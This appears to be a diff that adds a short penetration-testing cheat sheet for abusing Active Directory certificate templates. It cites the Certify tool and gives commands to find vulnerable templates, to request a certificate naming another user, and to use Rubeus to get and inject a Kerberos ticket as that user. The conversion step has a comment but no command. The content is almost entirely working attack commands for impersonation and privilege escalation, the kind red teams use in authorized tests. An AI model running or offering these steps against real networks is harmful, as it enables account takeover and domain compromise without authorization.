@@ -1,0 +1,14 @@
+# source
+https://github.com/GhostPack/Certify
+
+# get information about certificate environment and find vulnerable certificates (enrollment rights)
+Certify.exe find /vulnerable
+
+# request certificate (altUser is the user to impersonate)
+Certify.exe request /ca:"<fqdnCertificateServer>" /template:"<templateName>" /altname:"<altUser>"
+
+# convert pem file to pfx file using linux
+
+# impersonate user
+Rubeus.exe asktgt /user:<altUser> /certificate:<certificateFile>.pfx /ptt
+
